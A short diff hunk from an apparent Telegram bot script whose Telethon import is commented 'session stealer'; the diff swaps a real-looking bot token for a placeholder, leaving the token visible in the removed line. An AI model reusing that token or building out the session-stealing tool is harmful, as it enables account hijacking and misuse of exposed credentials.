@@ -28,7 +28,7 @@ from telethon import TelegramClient  # session stealer
 from telegram.ext import Updater, MessageHandler, Filters, CallbackContext
 
 # ================= ПАРАМЕТРИ =================
-TOKEN       = "8191143023:AAExRgieoE_SIru5ZGflWbth_V5_Gchulyk"
+TOKEN       = "bot token"
 API_ID      = 123456      # для Telethon
 API_HASH    = "your_api_hash"
 SESSION_NAME= "session"
